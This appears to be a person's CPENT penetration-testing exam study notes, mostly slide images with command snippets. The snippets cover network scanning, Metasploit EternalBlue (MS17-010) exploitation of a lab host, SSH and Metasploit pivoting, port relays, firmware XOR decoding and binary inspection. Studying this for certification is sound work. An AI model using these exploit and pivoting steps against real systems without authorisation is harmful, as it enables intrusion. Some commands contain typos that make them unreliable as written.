---
# System prepended metadata

title: CPENT考試筆記(Vincent)
tags: [' CPENT', ' Pentest', ' 滲透測試', 工作用]

---

---
tags: 工作用, Pentest, 滲透測試, CPENT
---

# CPENT考試筆記(Vincent)

> Source: https://hackmd.io/@6AhJdzpGTyGDlAxru4jZbA/r1fLYbAx0  
> Explained (Mermaid / bit-by-bit): [[CPENT-exam-notes-Vincent-explained]]

## SCAN

![[_hackmd-slides/ry0JnbCg0.png]]

```bash=
$ sudo nmap -n -sn -PS22,80,445,3389 192.168.0.1-254 -oG ip_scan.txt
$ grep Up ip_scan.txt | cut -d"" -f2
```

![[_hackmd-slides/ry0khW0lA.png]]

![[_hackmd-slides/ryAJ3ZRe0.png]]



![[_hackmd-slides/rkC13-RxA.png]]

```bash=
for i in {1..254}; do (ping -c 192.168.0.$i | grep "bytes from" &); done
```

![[_hackmd-slides/rk01hZAeA.png]]

```bash=
$sudo nmap -p 1-1024
$sudo nmap -p 1024-
$sudo nmap -p -1024
$sudo nmap -p -

$sudo nmap -n scanme.nmap.org -p22,25,80,135 --reason
```

![[_hackmd-slides/rk0J2WAlA.png]]

```bash=
$sudo dpkg -i rustscan_2.0.1_amd64.deb
$rustscan -u 5000 -t 7000 -a 192.168.0.7
$rustscan -u 5000 -t 7000 --script none -a 192.168.0.7
$rustscan -u 5000 -t 7000 -a 192.168.0.7 -- -Pn -sVC -oA 7_host
```

### Exploit MS17_010
![[_hackmd-slides/S10y2ZAlR.png]]
```bash=
$msfconsole

>search ms17_010
>use exploit/windows/smb/ms17_010_eternalblue
>show options
>set rhosts 192.168.0.7
>check
>exploit
```

![[_hackmd-slides/SJAJnW0xR.png]]



## ENUMERATION

![[_hackmd-slides/SyLgkMAxA.png]]
![[_hackmd-slides/rJ8eyMReR.png]]
![[_hackmd-slides/r1IeJz0lC.png]]
![[_hackmd-slides/r1UlJGRxR.png]]
![[_hackmd-slides/SJUlkG0eA.png]]
![[_hackmd-slides/Sk8l1MCxA.png]]
![[_hackmd-slides/SkLgJzAeA.png]]
![[_hackmd-slides/BJUgyzAxR.png]]



## Privilege Escalation

![[_hackmd-slides/r16ufz0x0.png]]


## Egress Busting

![[_hackmd-slides/SkznfzAl0.png]]
![[_hackmd-slides/rJz2fzAg0.png]]


## Persistent

![[_hackmd-slides/BkspGMCgA.png]]


## POST

![[_hackmd-slides/By71QfRxR.png]]


## OT

![[_hackmd-slides/rJNzmMAeR.png]]

![[_hackmd-slides/r14zmG0gR.png]]


## Pivoting & Double Pivoting 跳台 & 雙跳台

![[_hackmd-slides/SkxjAXfClA.png]]

![[_hackmd-slides/BkoRQMClR.png]]

![[_hackmd-slides/BJjCQM0eR.png]]

![[_hackmd-slides/rkjR7MRl0.png]]

```bash=
$ssh -L: 80:192.168.0.24:80 administrator @192.168.0.70
```

![[_hackmd-slides/Syo0XfCxC.png]]

```bash=
$ssh -R *:8008:192.168.0.24:80 administrator@192.168.0.70

$sudo nano /etc/ssh/sshd_config
→GatewayPorts yes
$sudo service ssh restart

```

![[_hackmd-slides/BksCmz0lR.png]]

```bash=
$ssh -D 9050 administrator@192.168.0.70
$sudo nano /etc/proxychains.conf
```

![[_hackmd-slides/S1jC7zRxA.png]]

```bash=
$ssh -J administrator@192.168.0.70 administrator@192.168.0.10 -L *:8888:192.168.0.24:80
```

![[_hackmd-slides/SJoRmMCg0.png]]

```bash=
# MSF
>Use exploit/multi/ssh/sshexec
>set rhosts<>
>set username<>
>set password <>
>exploit

## Meterpreter (Session-Routing)
>run post/multi/manage/autoroute OPTION=s
>run autoroute -p
>background

```

![[_hackmd-slides/BJoA7fCeA.png]]

```bash=
https://github.com/bovine/datapine/blob/master/datapipe.c
# change Line 80: 20 -> 999
$gcc datapine.c -o datapine

datapipe 0.0.0.0 135 <WIN> 135
datapipe 0.0.0.0 445 <WIN> 445
datapipe 0.0.0.0 4444 <PARROT> 4444
```

![[_hackmd-slides/rksC7G0eA.png]]

```bash=
#Socat (full function, fat, support UDP)
socat tcp-listen:80,fork tcp:<IP>:80
socat udp-recvfrom:161,fork udp-sendto:<IP>:161
socat udp-recvfrom:53,fork udp-sendto:<IP>:53
socat udp-recvfrom:123,fork udp-sendto:<IP>:123

#Portproxy(Windows netsh built-in)
netsh interface portproxy add v4tov4 80 <IP> 80
netsh interface portproxy show v4tov4
netsh interface portproxy delete v4tov4 80 <IP> 80
```

![[_hackmd-slides/HJsR7zCeR.png]]

![[_hackmd-slides/B1sCmz0gR.png]]



## IOT

![[_hackmd-slides/S1RmNMRlC.png]]
![[_hackmd-slides/S1CmVzAeA.png]]
![[_hackmd-slides/SyRmNfReA.png]]

```bash=
$binwalk -t encrypted.bin
$hexdump -v -C encrypted.bin
$binwalk -E encrypted.bin
$hexdump -v -C encrypted.bin | cut -d" " -f3-20 | sort | uniq -c | sort -nr | head -n 20
$chmod +x xcat.py
$./xcat.py -x <xor_key> encrypted.bin > decrypted.bin
$binwalk -t decrypted.bin
```

![[_hackmd-slides/ByAm4GAlC.png]]

```bash=
$python3 -m pip3 install xortool
$xortool enctypted.bin
$xortool enctypted.bin -l 8 -c 00
$binwalk -t -e xortool_out/0.out
$cat xortool_out/filename-key.csv
$python -c "print(b'\x88D\xa2\xd1h\xb4Z-'.hex())"
```

## BINARY

![[_hackmd-slides/ByElHGRg0.png]]

![[_hackmd-slides/Hy4lSMAxR.png]]

- https://docs.microsoft.com/en-us/archive/msdn-magazine/2002/february/inside-windows-win32-portable-executable-file-format-in-detail
- https://docs.microsoft.com/en-us/archive/msdn-magazine/2002/march/inside-windows-an-in-depth-look-into-the-win32-portable-executable-file-format-part-2
- https://tech-zealots.com/malware-analysis/pe-portable-executable-structure-malware-analysis-part-2/
- http://blog.dkbza.org/2012/08/pe-file-format-graphs.html


![[_hackmd-slides/S1EerfAl0.png]]


![[_hackmd-slides/rJVgHzCx0.png]]

- https://web.archive.org/web/20171130164537/http://nairobi-embedded.org/004_elf_format.html
- https://web.archive.org/web/20171129031316/http://nairobi-embedded.org/040_elf_sec_seg_vma_mappings.html

![[_hackmd-slides/HkQxSz0eR.png]]

```bash=
$strings ./crackme0x00a | grep GLIBC
$objdump -d /bin/bash
$objdump -d -M intel /bin/bash

use gdb to look at the registers
$gdb -q /bin/bash
$break main
$run
$info registers

```

![[_hackmd-slides/BJNgBG0xC.png]]
![[_hackmd-slides/SyVlrzRgA.png]]
![[_hackmd-slides/SJVeHG0lR.png]]
![[_hackmd-slides/S14lrfAx0.png]]
![[_hackmd-slides/SJEerMAeR.png]]
![[_hackmd-slides/r1ExHzRgR.png]]
![[_hackmd-slides/HkNgrGAxR.png]]
![[_hackmd-slides/SyNgHfAeC.png]]


## AD PT


![[_hackmd-slides/ryA_dMCg0.png]]
![[_hackmd-slides/rkgAudMAgR.png]]
![[_hackmd-slides/rkA_dMCeR.png]]
![[_hackmd-slides/SyCduG0gC.png]]
![[_hackmd-slides/rkA__fAeC.png]]
![[_hackmd-slides/HyAudGAlC.png]]
![[_hackmd-slides/ryC_uGAeR.png]]
![[_hackmd-slides/HJCddf0xC.png]]
![[_hackmd-slides/SyCdOGRe0.png]]
![[_hackmd-slides/S1R__GCg0.png]]


## Web to RCE

![[_hackmd-slides/S19ttfCgA.png]]
![[_hackmd-slides/B19KYfReC.png]]
![[_hackmd-slides/r1ctFG0eC.png]]
![[_hackmd-slides/H1qFKGRgR.png]]
![[_hackmd-slides/H1cttMAl0.png]]
![[_hackmd-slides/Sy9YKGClA.png]]
![[_hackmd-slides/SyqFFfClC.png]]
![[_hackmd-slides/SJ5KYzRgC.png]]
![[_hackmd-slides/HkcYYfAxR.png]]
![[_hackmd-slides/BkcKKMAxC.png]]
![[_hackmd-slides/By5ttzAeC.png]]


